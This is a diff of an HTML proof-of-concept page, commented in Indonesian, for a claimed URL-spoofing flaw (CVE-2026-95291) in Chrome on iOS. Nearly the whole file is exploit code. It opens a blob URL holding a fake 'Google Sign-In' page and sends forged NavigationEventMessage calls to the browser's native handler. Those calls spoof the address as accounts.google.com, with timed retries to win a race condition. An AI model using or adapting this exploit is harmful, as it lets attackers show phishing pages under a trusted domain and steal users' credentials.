@@ -6,133 +6,145 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Advanced CVE-2026-95291 PoC - Reinforced</title>
+    <title>CVE-2026-95291 Full Standalone PoC</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #0b0b0b;
+        background: #0f0f0f;
         color: #ffffff;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
       }
-      .box {
-        text-align: center;
-        padding: 40px;
+      .card {
         background: #1a1a1a;
+        padding: 40px;
         border-radius: 16px;
-        box-shadow: 0 8px 30px rgba(0,0,0,0.8);
+        text-align: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        max-width: 450px;
+        width: 90%;
       }
       button {
-        padding: 18px 36px;
-        font-size: 18px;
-        font-weight: 700;
+        padding: 18px 32px;
+        font-size: 16px;
+        font-weight: bold;
         background: #ff3b30;
         color: #fff;
         border: none;
         border-radius: 12px;
         cursor: pointer;
-        transition: background 0.2s;
+        transition: background 0.2s ease;
       }
-      button:active {
-        background: #d32f2f;
+      button:hover {
+        background: #e0322b;
+      }
+      .status {
+        margin-top: 20px;
+        font-size: 13px;
+        color: #888;
+        font-family: monospace;
       }
     </style>
   </head>
   <body>
-    <div class="box">
-      <h2 style="margin-top:0; font-size:24px; color:#ff3b30;">Reinforced Blob Spoofing</h2>
-      <p style="color:#888; font-size:14px; margin-bottom:24px;">Menguji injeksi pesan Navigasi berulang untuk bypass timing.</p>
-      <button id="reinforcedBtn">LUNCURKAN EKSPLOITASI</button>
+    <div class="card">
+      <h2 style="margin-top:0; color:#ff3b30;">Blob Origin Spoofing</h2>
+      <p style="font-size:14px; color:#aaa; margin-bottom:24px;">
+        Simulasi eksploitasi kolisi kosong <code>DeprecatedGetOriginAsURL</code> pada Chrome iOS.
+      </p>
+      <button id="launchBtn">LUNCURKAN EKSPLOITASI BLOB</button>
+      <div class="status" id="statusLog">Menunggu aksi pengguna...</div>
     </div>
 
     <script>
-      document.getElementById("reinforcedBtn").onclick = function () {
-        this.disabled = true;
-        this.innerText = "MENGEKSEKUSI...";
-
-        // 1. Konten HTML Penyerang untuk Dokumen Blob
-        const maliciousPayload = `
-          <!DOCTYPE html>
-          <html>
-          <head>
-            <meta charset="utf-8">
-            <title>Google Secure Authentication</title>
-          </head>
-          <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
-            <div style="padding: 40px; max-width: 480px;">
-              <h1 style="font-size:32px;font-weight:800;color:#1a73e8;margin:0 0 12px 0;">Google</h1>
-              <p style="font-size:18px;font-weight:600;color:#202124;margin:0 0 8px 0;">Verifikasi Identitas Anda</p>
-              <p style="font-size:14px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda memerlukan autentikasi ulang karena perubahan keamanan.</p>
-              <div style="border: 2px dashed #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
-                <p style="font-size:13px; color:#d93025; font-weight:700; margin:0;">[DOM Terkendali Penyerang di Bawah Domain Tepercaya]</p>
-              </div>
+      // 1. Template HTML Dokumen Malicious yang akan di-wrap ke dalam Blob URL
+      const maliciousPayload = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="utf-8">
+          <title>Google Sign-In</title>
+        </head>
+        <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+          <div style="padding: 40px; max-width: 480px;">
+            <h1 style="font-size:32px;font-weight:800;color:#1a73e8;margin:0 0 12px 0;">Google</h1>
+            <p style="font-size:18px;font-weight:600;color:#202124;margin:0 0 8px 0;">Autentikasi Diperlukan</p>
+            <p style="font-size:14px;color:#5f6368;margin:0 0 24px 0;">Sesi Anda telah berakhir, silakan masuk kembali.</p>
+            <div style="border: 2px dashed #dadce0; padding: 20px; border-radius: 8px; background: #f8f9fa;">
+              <p style="font-size:13px; color:#d93025; font-weight:700; margin:0;">[Konten Terkendali Penyerang di Bawah URL Terpercaya]</p>
             </div>
-          </body>
-          </html>
-        `;
+          </div>
+          <script>
+            (function(){
+              // Fungsi di dalam dokumen Blob untuk melakukan komunikasi langsung ke handler native iOS Chrome
+              var logMsg = function(m) { console.log('[BLOB_PAYLOAD] ' + m); };
+              
+              var mh = (window.webkit && window.webkit.messageHandlers) || {};
+              if (!mh.NavigationEventMessage) {
+                logMsg('NavigationEventMessage handler tidak ditemukan.');
+                return;
+              }
 
+              var fireSpoof = function(attempt) {
+                try {
+                  var fid = null;
+                  if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+                    fid = window.__gCrWeb.getFrameId();
+                  }
+                  if (!fid) fid = "main-frame"; // Fallback identifier
+
+                  if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
+                    window.__gCrWeb.registerFrame();
+                  }
+
+                  // Mengirimkan command willChangeState lalu didReplaceState dengan memalsukan pageUrl
+                  mh.NavigationEventMessage.postMessage({
+                    command: 'willChangeState',
+                    frame_id: fid
+                  });
+
+                  mh.NavigationEventMessage.postMessage({
+                    command: 'didReplaceState',
+                    frame_id: fid,
+                    stateObject: '',
+                    baseUrl: 'https://x/',
+                    pageUrl: 'blob:https://accounts.google.com/signin'
+                  });
+                  logMsg('Eksploitasi dipancarkan pada percobaan ke-' + attempt);
+                } catch(e) {
+                  logMsg('Gagal mengirim pesan: ' + e);
+                }
+              };
+
+              // Penjadwalan berulang untuk mengantisipasi race condition commit timing
+              setTimeout(function(){ fireSpoof(1); }, 150);
+              setTimeout(function(){ fireSpoof(2); }, 500);
+              setTimeout(function(){ fireSpoof(3); }, 1200);
+            })();
+          <\/script>
+        </body>
+        </html>
+      `;
+
+      document.getElementById("launchBtn").onclick = function () {
+        const statusEl = document.getElementById("statusLog");
+        statusEl.innerText = "Membuat Blob URL...";
+
+        // 2. Pembuatan Blob URL lokal
         const blob = new Blob([maliciousPayload], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 2. Membuka tab target menggunakan Blob URL
+        statusEl.innerText = "Membuka tab baru...";
         const targetTab = window.open(blobUrl, "_blank");
 
         if (targetTab) {
-          let attempts = 0;
-          const maxAttempts = 15;
-
-          // 3. Polling Berkelanjutan untuk Mendeteksi Registrasi Frame & Mengirim Forged Message
-          const aggressiveInjector = setInterval(() => {
-            attempts++;
-            try {
-              if (targetTab.window && targetTab.window.__gCrWeb) {
-                // Ambil Frame ID
-                const frameId = typeof targetTab.window.__gCrWeb.getFrameId === 'function' 
-                  ? targetTab.window.__gCrWeb.getFrameId() 
-                  : 0;
-
-                // Daftarkan frame secara paksa
-                if (typeof targetTab.window.__gCrWeb.registerFrame === 'function') {
-                  targetTab.window.__gCrWeb.registerFrame();
-                }
-
-                // Periksa ketersediaan messageHandlers
-                if (targetTab.window.webkit && 
-                    targetTab.window.webkit.messageHandlers && 
-                    targetTab.window.webkit.messageHandlers.NavigationEventMessage) {
-                  
-                  // Kirim sinyal willChangeState
-                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
-                    command: "willChangeState",
-                    frame_id: frameId
-                  });
-
-                  // Kirim payload didReplaceState dengan target domain tepercaya (misal: accounts.google.com)
-                  targetTab.window.webkit.messageHandlers.NavigationEventMessage.postMessage({
-                    command: "didReplaceState",
-                    pageUrl: "blob:https://accounts.google.com/signin",
-                    baseUrl: "https://x/",
-                    stateObject: "",
-                    frame_id: frameId
-                  });
-
-                  console.log(`[+] Eksploitasi berhasil dipancarkan pada percobaan ke-${attempts}`);
-                  clearInterval(aggressiveInjector);
-                }
-              }
-            } catch (e) {
-              // Abaikan error cross-origin/stale reference selama proses polling awal
-            }
-
-            if (attempts >= maxAttempts) {
-              clearInterval(aggressiveInjector);
-              console.log("[-] Polling dihentikan: Batas percobaan tercapai.");
-            }
-          }, 80); // Interval pengecekan super cepat setiap 80ms
+          statusEl.innerText = "Tab terbuka. Menunggu eksekusi payload...";
+        } else {
+          statusEl.innerText = "Gagal membuka tab (diblokir Pop-up Blocker).";
         }
       };
     </script>
